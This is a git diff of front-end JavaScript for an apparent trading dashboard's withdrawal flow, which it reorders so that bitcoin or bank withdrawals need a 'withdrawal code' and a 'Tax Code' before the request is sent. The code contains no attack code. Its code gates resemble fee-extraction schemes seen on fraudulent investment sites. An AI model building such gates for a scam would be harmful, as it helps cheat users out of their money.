@@ -463,7 +463,7 @@ function displayBitcoinForm() {
   withdrawalModal.classList.toggle("hidden");
 }
 
-// logic for bitcoin withdraw method
+// logic to display bitcoin withdraw method
 const bitcoinForm = document.getElementById("bitcoin-form");
 const bankForm = document.getElementById("bank-form");
 
@@ -474,7 +474,7 @@ function bitcoinWithdraw() {
   bankForm.classList.add("hidden");
 }
 
-// logic for bank withdrawal
+// logic to display bank withdrawal method
 const bankTransferBtn = document.getElementById("bankTransferBtn");
 bankTransferBtn.addEventListener("click", bankTransferWithdraw);
 function bankTransferWithdraw() {
@@ -482,11 +482,15 @@ function bankTransferWithdraw() {
   bitcoinForm.classList.add("hidden");
 }
 
-// logic to handle bitcoin and bank submission methods
+// logic to handle bitcoin and bank methods form submission
 const withdrawalForm = document.querySelectorAll(".withdrawalForm");
 withdrawalForm.forEach((form) => {
   form.addEventListener("submit", withdrawalMethodSubmission);
 });
+
+// declare payload to be used
+var payload;
+
 async function withdrawalMethodSubmission(e) {
   e.preventDefault();
   const form = e.target;
@@ -508,7 +512,7 @@ async function withdrawalMethodSubmission(e) {
     return;
   }
 
-  const payload = {
+  payload = {
     amount,
     username: usernameG,
     method: formData.get("method"),
@@ -519,39 +523,14 @@ async function withdrawalMethodSubmission(e) {
     payload.walletAddress = formData.get("wallet");
   }
 
-  const submitButton = form.querySelector('button[type="submit"]');
-  try {
-    submitButton.disabled = true;
-    submitButton.innerText = "Processing...";
-
-    const response = await QuestZender(
-      url() + "/dashboard/withdrawal-request",
-      "POST",
-      JSON.stringify(payload),
-      showNotLoggedModal
-    );
-
-    var message = await response.json();
-    if (response.ok) {
-      toast(
-        "success",
-        "Request Sent!",
-        message.data + " To proceed you have to input your withdrawal code."
-      );
-
-      withdrawalModal.classList.add("hidden");
-      chartContainer.innerHTML = menuContentMap.withdrawal.content[0];
-      window.location = "/dashboard/#tradingview-widget";
-      activateWithdrawalCodeSubmission();
-    } else {
-      toast("error", "Withdrawal Request Failed", message.error);
-    }
-  } catch (error) {
-    alert(error);
-  } finally {
-    submitButton.disabled = false;
-    submitButton.innerText = "Proceed";
-  }
+  toast(
+    "info",
+    "Tax Code Required",
+    "You need to provide a tax code to proceed..."
+  );
+  withdrawalModal.classList.add("hidden");
+  chartContainer.innerHTML = menuContentMap.withdrawal.content[1];
+  activateTaxCodeSubmission();
 }
 
 // LOGIC TO HANDLE SUBMIT WITHDRAWAL CODE
@@ -563,7 +542,7 @@ async function submitWithdrawalCode() {
     return;
   }
 
-  // verify code with api
+  // verify tax code with api
   const response = await QuestZender(
     url() + `/dashboard/verify-tax-code/?taxCode=${pin}`,
     "GET",
@@ -579,16 +558,17 @@ async function submitWithdrawalCode() {
   toast(
     "success",
     "Verification successful!",
-    "Withdrawal code verification successful. To proceed you need to provide a TAX CODE next."
+    "Withdrawal code verification successful."
   );
-  // insert tax code form
-  chartContainer.innerHTML = menuContentMap.withdrawal.content[1];
-  activateTaxCodeSubmission();
+
+  // wait, then display withdrawal method form
+  setTimeout(() => {
+    displayBitcoinForm();
+  }, 2000);
 }
 
 // LOGIC TO HANDLE SUBMIT TAX CODE
 async function submitTaxCode() {
-  console.log("first");
   const pin = document.getElementById("taxPin").value.trim();
   if (!pin) {
     toast("info", "No Code Provided", "Please enter your unique code.");
@@ -610,9 +590,42 @@ async function submitTaxCode() {
     "success",
     "Verification successful",
     message.data +
-      " Your withdrawal request process is complete. Congratulations!"
+      "Your Tax Code has been verified! Please wait while we save your withdrawal details..."
   );
-  window.location = "/dashboard/#header";
+
+  // trigger save withdrawal method data
+  submitWithdrawalMethodData();
+}
+
+// Finally submit withdrawal method payload/data
+async function submitWithdrawalMethodData() {
+  try {
+    console.log(payload);
+    // submitting withdrawal data
+    const response = await QuestZender(
+      url() + "/dashboard/withdrawal-request",
+      "POST",
+      JSON.stringify(payload),
+      showNotLoggedModal
+    );
+
+    var message = await response.json();
+    if (response.ok) {
+      toast(
+        "success",
+        "Process complete!",
+        message.data +
+          " Your withdrawal request process is complete. Congratulations!"
+      );
+
+      withdrawalModal.classList.add("hidden");
+      window.location = "/dashboard/#header";
+    } else {
+      toast("error", "Failed to save withdrawal data", message.error);
+    }
+  } catch (error) {
+    alert(error);
+  }
 }
 
 // initialize event listener for withdrawal code form
@@ -751,11 +764,10 @@ function loadContent(target) {
   } else if (target === "kyc") {
     loadKycForm();
   } else if (target === "withdrawal") {
-    withdrawalModal.addEventListener(
-      "click",
-      displayBitcoinForm(withdrawalModal)
-    );
-
+    const contentData = menuContentMap[target];
+    mainContentHeader.textContent = contentData.title;
+    chartContainer.innerHTML = contentData.content[0];
+    activateWithdrawalCodeSubmission();
     return;
   } else if (target === "history") {
     fetchWithdrawalHistory();
